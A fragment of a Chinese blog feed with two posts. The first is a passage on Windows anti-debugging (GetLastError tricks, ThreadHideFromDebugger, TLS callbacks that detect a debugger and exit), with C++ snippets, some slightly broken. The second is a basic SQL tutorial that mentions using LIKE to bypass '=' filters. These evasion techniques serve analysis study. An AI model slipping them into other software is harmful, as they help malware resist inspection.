id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h5><h5 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h5><h5 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a>GetLastError</h5><ul><li><p>编写应用程序时，经常需要涉及到错误处理问题。许多函数调用只用TRUE和FALSE来表明函数的运行结果。一旦出现错误，MSDN中往往会指出请用GetLastError()函数来获得错误原因。恶意代码可以使用异常来破坏或者探测调试器。</p></li><li><p>调试器捕获异常后，并不会立即将处理权返回被调试进程处理，大多数利用异常的反调试技术往往据此来检测调试器。多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测。</p></li><li><p>对于OutputDebugString函数，它的作用是在调试器中显示一个字符串，同时它也可以用来探测调试器的存在。<strong>使用SetLastError函数，将当前的错误码设置为一个任意值。</strong></p><ul><li><strong>如果进程没有被调试器附加</strong>，调用OutputDebugString函数会失败，错误码会重新设置，<strong>因此GetLastError获取的错误码应该不是我们设置的任意值</strong>。</li><li><strong>如果进程被调试器附加</strong>，调用OutputDebugString函数会成功，<strong>这时GetLastError获取的错误码应该没改变</strong>。</li></ul></li><li><p>对于DeleteFiber函数，如果给它传递一个无效的参数的话会抛出ERROR_INVALID_PARAMETER异常。如果进程正在被调试的话，异常会被调试器捕获。所以，同样可以通过验证LastError值来检测调试器的存在。如代码所示，<strong>0x57就是指ERROR_INVALID_PARAMETER。</strong></p></li><li><p>同样还可以使用CloseHandle、CloseWindow产生异常，使得错误码改变。</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CheckDebug0(){     DWORD errorValue = 12345;      SetLastError(errorValue);      OutputDebugString("Test for debugger!");      if (GetLastError() == errorValue)          return TRUE;      return FALSE;  }BOOL CheckDebug1() {      char fib[1024] = {0};      DeleteFiber(fib);      return (GetLastError() != 0x57);  }  BOOL CheckDebug2()       DWORD ret = CloseHandle((HANDLE)0x1234);      if (ret != 0 || GetLastError() != RROR_INVALID_HANDLE) {         return TRUE;      return FALSE;}  BOOL CheckDebug3() {      DWORD ret = CloseWindow((HWND)0x1234);      if (ret != 0 || GetLastError() != ERROR_INVALID_WINDOW_HANDLE) {          return TRUE;       return FALSE;  }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h5><p>ZwSetInformationThread拥有两个参数，</p><ul><li>第一个参数用来接收当前线程的句柄，第二个参数表示线程信息类型，若其值设置为ThreadHideFromDebugger(0x11)，使用语句ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);调用该函数后，调试进程就会被分离出来。</li><li>该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，<strong>因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试</strong>。还有一个函数DebugActiveProcessStop用来分离调试器和被调试进程，从而停止调试。两个API容易混淆，需要牢记它们的区别。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef enum _THREAD_INFORMATION_CLASS {       ThreadBasicInformation,       ThreadTimes,       ThreadPriority,       ThreadBasePriority,       ThreadAffinityMask,       ThreadImpersonationToken,       ThreadDescriptorTableEntry,       ThreadEnableAlignmentFaultFixup,       ThreadEventPair,       ThreadQuerySetWin32StartAddress,       ThreadZeroTlsCell,       ThreadPerformanceCount,       ThreadAmILastThread,       ThreadIdealProcessor,       ThreadPriorityBoost,       ThreadSetTlsArrayAddress,       ThreadIsIoPending,       ThreadHideFromDebugger           // 17 (0x11)   } THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;typedef NTSTATUS (WINAPI* ZWSETINFORMATIONTHREAD)(       HANDLE ThreadHandle,       THREAD_INFORMATION_CLASS ThreadInformationClass,       PVOID ThreadInformation,       ULONG ThreadInformationLength   );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h4><h4 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h4><h5 id="TSL变量"><a href="#TSL变量" class="headerlink" title="TSL变量"></a>TSL变量</h5><p>TLS：Thread Local Storage即线程局部存储；TLS是一种<strong>方法</strong>，通过这种方法，给定多线程进程中的每个线程可以分配位置来<strong>存储特定于线程的数据</strong>。通过TLS API (TlsAlloc)支持**动态绑定(运行时)<strong>特定于线程的数据。Win32和Microsoft c++编译器现在除了现有的API实现外，还支持</strong>静态绑定(加载时)**每个线程数据。</p><p>​TLS主要是为了解决多线程中变量的<strong>同步</strong>问题，进程中的全局变量和函数内定义的静态(static)变量，是每个线程都可以访问的<strong>共享变量</strong>。只要有任何一个线程修改了共享变量，其他所有线程中的共享变量也会<strong>同步被修改</strong></p><p>​TLS变量即：同一个线程里面调用的各个函数都可以访问、但其他线程无法访问的变量（被称为static memory local to a thread 线程局部静态变量）</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//TLS测试代码__declspec(thread) int global = 600; //声明TLS变量DWORD WINAPI threadFunc1(LPVOID parameter) {global = 666;std::cout &lt;&lt; "Thread1 global value set to " &lt;&lt; global &lt;&lt; std::endl;return 0;}DWORD WINAPI threadFunc2(LPVOID parameter) {Sleep(200); //等待200ms，使得线程1先输出完毕std::cout &lt;&lt; "Thread2 global value set to " &lt;&lt; global &lt;&lt; std::endl;return 0;}void TLSTest() {HANDLE hThread1 = CreateThread(NULL, NULL, threadFunc1, NULL, NULL, NULL);HANDLE hThread2 = CreateThread(NULL, NULL, threadFunc2, NULL, NULL, NULL);::WaitForSingleObject(hThread2, -1);::CloseHandle(hThread1);::CloseHandle(hThread2);system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从结果可以看出，全局变量在线程1中已经被修改为666，但是在线程2中依然为600；</p><p><img src="/2023/04/04/antibebug/3.png"></p><h5 id="TLS静态绑定"><a href="#TLS静态绑定" class="headerlink" title="TLS静态绑定"></a>TLS静态绑定</h5><p>TLS静态绑定主要体现在<strong>TLS回调函数</strong>上</p><ul><li><p>程序可以提供<strong>一个或多个</strong>TLS回调函数，以支持TLS数据对象的附加初始化和终止；</p></li><li><p>尽管通常只有一个回调函数，但回调函数是作为<strong>数组</strong>实现的，以便在需要时可以添加额外的回调函数；</p></li><li><p>如果有多个回调函数，则<strong>按其地址在数组中出现的顺序</strong>调用每个函数。<strong>空指针终止数组</strong>。空列表是完全有效的(不支持回调)，在这种情况下，回调数组只有一个成员—— null ptr（空指针）。</p></li></ul><p>使用TLS静态绑定三部曲：</p><ul><li><p>1）编译器声明使用TLS</p></li><li><p>2）定义TLS回调函数</p></li><li><p>3）注册TLS回调函数</p></li></ul><p>反调试原理：</p><ul><li>TLS回调函数: <strong>创建或终止某线程时,TLS函数会自动调用执行</strong></li><li>TLS函数在EP之前执行,因此可以将反调试的代码放在TLS回调函数里面</li></ul><p><strong>CheckRemoteDebuggerPresent() API</strong></p><ul><li>第一个参数，为要Check的进程的句柄；</li><li>第二个参数，为一个PBOOL，表示当前进程是否处于调试状态</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//TLS静态绑定//1、编译器声明使用TLS#ifdef _WIN64       //64位#pragma comment (linker, "/INCLUDE:_tls_used")  #pragma comment (linker, "/INCLUDE:tls_callback_func") #else               //32位#pragma comment (linker, "/INCLUDE:__tls_used") #pragma comment (linker, "/INCLUDE:_tls_callback_func")#endif//2、定义TLS回调函数void NTAPI tls_callback0(PVOID Dllhandle, DWORD Reason, PVOID Reserved) {BOOL ret;::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &amp;ret);if (ret) {MessageBox(NULL, L"Funk You", L"TLS0AntiDebug", MB_OK);//::ExitProcess(0);}}void NTAPI tls_callback1(PVOID Dllhandle, DWORD Reason, PVOID Reserved) {BOOL ret;::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &amp;ret);if (ret) {MessageBox(NULL, L"Funk You", L"TLS1AntiDebug", MB_OK);::ExitProcess(0);}}//3、注册TLS回调函数/*CRT表示使用C Runtime 机制X表示 标识名随机L表示 TLS Callback sectionF也可以替换成B~Y的任意一个字符*/#ifdef _WIN64                           //64位#pragma const_seg(".CRT$XLF")EXTERN_C const#else#pragma data_seg(".CRT$XLF")        //32位EXTERN_C#endifPIMAGE_TLS_CALLBACK tls_callback_func[] = { tls_callback0, tls_callback1, 0 }; //TLS回调函数数组，以NULL结尾。#ifdef _WIN64                           //64位#pragma const_seg()#else#pragma data_seg()                  //32位#endif //_WIN64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到程序会先依次执行TLS回调函数</p><p><img src="/2023/04/04/antibebug/5.png" alt="tls_callback0"></p><p><img src="/2023/04/04/antibebug/6.png" alt="tls_callback1"></p>]]></content>
      
      
      <categories>
          
          <category> 反调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态反调试技术 </tag>
            
            <tag> TEB、PEB、TLS、反调试API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL语法</title>
      <link href="/2023/04/03/sql/"/>
      <url>/2023/04/03/sql/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h3><p>cmd命令行输入：</p><p>mysql -u username -p</p><p>or </p><p>mysql -u username -ppassword(这里-p要和你的密码紧靠在一起)</p><p><img src="/2023/04/03/sql/1.png" alt="1"></p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><h4 id="创建数据库、表"><a href="#创建数据库、表" class="headerlink" title="创建数据库、表"></a>创建数据库、表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> dbname<span class="token punctuation">;</span> <span class="token comment">#创建数据库</span><span class="token keyword">DROP</span> <span class="token keyword">DATABASE</span> dbname<span class="token punctuation">;</span>  <span class="token comment">#删除数据库</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> table_name； <span class="token comment">#删除表</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table_name <span class="token comment">#创建数据库中的表</span><span class="token punctuation">(</span>column_name1 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span>column_name2 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span>column_name3 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>column_name：参数规定表中列的名称<span class="token punctuation">;</span>data_type：参数规定列的数据类型（例如 <span class="token keyword">varchar</span>、<span class="token keyword">integer</span>、<span class="token keyword">decimal</span>、<span class="token keyword">date</span> 等等）<span class="token punctuation">;</span>size：参数规定表中列的最大长度；constraint_name<span class="token punctuation">(</span>可选<span class="token punctuation">)</span>：约束名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>约束(Constraints)</strong></p><p>SQL 约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。<strong>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）</strong>。</p><p>在 SQL 中，我们有如下约束：</p><ul><li><strong>NOT NULL</strong> - 指示某列不能存储 NULL 值。</li><li><strong>UNIQUE</strong> - 保证某列的每行必须有唯一的值。</li><li><strong>PRIMARY KEY</strong> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</li><li><strong>FOREIGN KEY</strong> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</li><li><strong>CHECK</strong> - 保证列中的值符合指定的条件。</li><li><strong>DEFAULT</strong> - 规定没有给列赋值时的默认值。</li></ul><h4 id="ALTER-待写"><a href="#ALTER-待写" class="headerlink" title="ALTER(待写)"></a>ALTER(待写)</h4><h4 id="DROP-待写"><a href="#DROP-待写" class="headerlink" title="DROP(待写)"></a>DROP(待写)</h4><p>注意：SQL语言中每条命令以<code>;</code>结尾；</p><p>show databases;   ==&gt;  展现所有数据库名</p><p>show tables;  ==&gt; 展现当前数据库的所有表名</p><p>use databaseName;  ==&gt; 使用databaseName数据库</p><p><img src="/2023/04/03/sql/2.png"></p><h3 id="数据查询语句"><a href="#数据查询语句" class="headerlink" title="数据查询语句"></a>数据查询语句</h3><h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>SELECT：用于从数据库中选取数据；</p><p>基本格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>column1, column2, …：要选择的字段名称，可以为多个字段。如果不指定字段名称或指定为<code>*</code>，则会选择所有字段;</li><li>table_name：要查询的表名称。</li></ul><p><img src="/2023/04/03/sql/3.png" alt="3"></p><h4 id="SELECT-DISTINCT"><a href="#SELECT-DISTINCT" class="headerlink" title="SELECT DISTINCT"></a>SELECT DISTINCT</h4><p>SELECT DISTINCT：用于返回唯一不同的值。</p><p>基本格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>**column1, column2, …**：要选择的字段名称，可以为多个字段。如果不指定字段名称或指定为<code>*</code>，则会选择所有字段;</li><li><strong>table_name</strong>：要查询的表名称。</li></ul><p>如下：去除了city列中的重复值；</p><p><img src="/2023/04/03/sql/4.png" alt="4"></p><p><strong>Note：</strong>若指定了多个column，则表示排除column都相等的；</p><h4 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h4><p>WHERE：该子句用于过滤记录；用于提取那些满足指定条件的记录。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>condition：指定的条件，可以用<code>AND/&amp;&amp;</code>或者<code>OR/||</code>连接多个条件，或在condition前加NOT表示否定;优先级：()&gt;not&gt;and&gt;or;</li><li>column，table_name解释如上SELECT;</li></ul><p><img src="/2023/04/03/sql/5.png" alt="5"></p><p><strong>Note：</strong>SQL 使用单引号<code>''</code>来环绕文本值(可双引号<code>""</code>)；如果是数值字段，请不要使用引号。</p><h5 id="可在where子句中使用的运算符"><a href="#可在where子句中使用的运算符" class="headerlink" title="可在where子句中使用的运算符"></a>可在where子句中使用的运算符</h5><table><thead><tr><th align="left">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">=</td><td align="center">等于</td></tr><tr><td align="left">&lt;&gt;</td><td align="center">不等于。<strong>注释：</strong>在 SQL 的一些版本中，该操作符可被写成 !=</td></tr><tr><td align="left">&gt;</td><td align="center">大于</td></tr><tr><td align="left">&lt;</td><td align="center">小于</td></tr><tr><td align="left">&gt;=</td><td align="center">大于等于</td></tr><tr><td align="left">&lt;=</td><td align="center">小于等于</td></tr><tr><td align="left">BETWEEN</td><td align="center">在某个范围内</td></tr><tr><td align="left">LIKE</td><td align="center">搜索某种模式</td></tr><tr><td align="left">IN</td><td align="center">指定针对某个列的多个可能值</td></tr></tbody></table><h6 id="LIKE运算符"><a href="#LIKE运算符" class="headerlink" title="LIKE运算符"></a>LIKE运算符</h6><p>LIKE：该操作符用于在WHERE 子句中搜索列中的指定模式。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">LIKE</span> pattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>pattern：搜索模式。</li></ul><p><strong>通配符：</strong>可用于替代字符串中的任何其他字符。</p><table><thead><tr><th align="left">通配符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">%</td><td align="center">替代 0 个或多个字符</td></tr><tr><td align="left">_</td><td align="center">替代一个字符</td></tr><tr><td align="left">[<em>charlist</em>]</td><td align="center">字符列中的任何单一字符</td></tr><tr><td align="left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td><td align="center">不在字符列中的任何单一字符</td></tr></tbody></table><p><strong>LIKE 与 通配符 配合使用：</strong></p><p>当 like后面直接加具体的值(column like value)则相当于 column=vlaue，可以用来饶过<code>=</code>过滤；</p><p><img src="/2023/04/03/sql/8.png" alt="8"></p><p><strong>[charlist]通配符：</strong>MySQL 中使用 <strong>REGEXP</strong> 或 <strong>NOT REGEXP</strong> 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">REGEXP</span> pattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>pattern：正则表达式。</li></ul><p><img src="/2023/04/03/sql/9.png" alt="9"></p><h6 id="IN运算符"><a href="#IN运算符" class="headerlink" title="IN运算符"></a>IN运算符</h6><p>IN：该操作符允许您在 WHERE 子句中规定多个值。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">IN</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>value1, value2, …：要查询的值，可以为多个值。</li></ul><p><img src="/2023/04/03/sql/10.png" alt="10"></p><p>Note：其实就相当于 column_ = value1 || column_ = value2 || …</p><h6 id="BETWEEN运算符"><a href="#BETWEEN运算符" class="headerlink" title="BETWEEN运算符"></a>BETWEEN运算符</h6><p>BETWEEN：该操作符用于选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</p><p>格式：BETWEEN … AND ….</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">BETWEEN</span> value1 <span class="token operator">AND</span> value2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>value1、value2：范围的起始值和结束值。</li></ul><p><img src="/2023/04/03/sql/6.png" alt="6"></p><p>Note：如果是文本的话，按照字符对应的数值依此比较；如下：</p><p><img src="/2023/04/03/sql/7.png" alt="7"></p><p><strong>Note：</strong></p><ul><li>在某些数据库中，BETWEEN 不包括两个测试值的字段；</li><li>在某些数据库中，BETWEEN 包括两个测试值的字段；</li><li>在某些数据库中，BETWEEN 包括第一个但不包括最后一个测试值的字段。</li></ul><p><strong>WHERE特殊使用情况：</strong></p><ul><li>直接 where 0(非0); 0时返回空，1时返回所有查询的列的值</li></ul><p><img src="/2023/04/03/sql/11.png" alt="11"></p><ul><li>空值判断：is null</li></ul><p>eg：select * from p where color is null; 查询color列中的空值。</p><h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>order by： 该关键字用于对结果集<strong>按照一个列或者多个列进行排序</strong>。默认按照升序排序。如果需要按照降序排序，可使用 DESC 关键字。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">ASC</span><span class="token operator">|</span><span class="token keyword">DESC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column1, column2, …：要排序的字段名称，column1全局排序，column2,…则是局部排序；</li><li>ASC：表示按升序排序；</li><li>DESC：表示按降序排序。</li></ul><p><img src="/2023/04/03/sql/12.png" alt="12"></p><p>可以看出：qty是降序的，而jno在qty相同的情况下是升序的</p><h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h4><p>LIMIT：用于规定要返回的记录的数目。</p><p>格式：（MySQL中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table_name<span class="token keyword">LIMIT</span> number<span class="token punctuation">;</span> <span class="token comment">#number为返回记录的数目</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/16.png" alt="16"></p><h4 id="AS-SQL-别名"><a href="#AS-SQL-别名" class="headerlink" title="AS(SQL 别名)"></a>AS(SQL 别名)</h4><p>通过SQL，可以为表名称或列名称指定别名。 </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#列的 SQL 别名语法</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">AS</span> alias_name<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span class="token comment">#表的 SQL 别名语法</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table_name <span class="token keyword">AS</span> alias_name<span class="token punctuation">;</span><span class="token comment">#Note：如果列名称包含空格，要求使用双引号或方括号：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在下面的情况下，使用别名很有用：</p><ul><li>在查询中涉及超过一个表</li><li>在查询中使用了函数</li><li>列名称很长或者可读性差</li><li>需要把两个列或者多个列结合在一起</li></ul><h4 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h4><p>JOIN ：用于把来自两个或多个表的行结合起来，基于这些表之间的<strong>共同字段</strong>。</p><p>在使用 <strong>join</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p><ul><li><strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li><li><strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li></ul><p><strong>A inner join B</strong> 取交集；</p><p><strong>A left join B</strong> 取 A 全部，B 没有对应的值为 null；</p><p><strong>A right join B</strong> 取 B 全部 A 没有对应的值为 null；</p><p><strong>A full outer join B</strong> 取并集，彼此没有对应的值为 null。</p><h5 id="INNER-JOIN"><a href="#INNER-JOIN" class="headerlink" title="INNER JOIN"></a>INNER JOIN</h5><p>INNER JOIN：在表中存在至少一个匹配时返回行；等同于JOIN。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">or</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>column_name(s)：要显示的列名。</li><li>table1：表1的名称。</li><li>table2：表2的名称。</li><li>tablex.column_name：表中用于连接的列名。</li></ul><p><img src="/2023/04/03/sql/17.png" alt="17"></p><h5 id="LEFT-JOIN"><a href="#LEFT-JOIN" class="headerlink" title="LEFT JOIN"></a>LEFT JOIN</h5><p>LEFT JOIN：从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">or</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">LEFT</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/18.png" alt="18"></p><h5 id="RIGHT-JOIN"><a href="#RIGHT-JOIN" class="headerlink" title="RIGHT JOIN"></a>RIGHT JOIN</h5><p>与LEFT JOIN相反，使用相同把left 改为 right即可。</p><h5 id="FULL-JOIN"><a href="#FULL-JOIN" class="headerlink" title="FULL JOIN"></a>FULL JOIN</h5><p>FULL OUTER JOIN：关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行；结合了 LEFT JOIN 和 RIGHT JOIN 的结果。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">FULL</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token 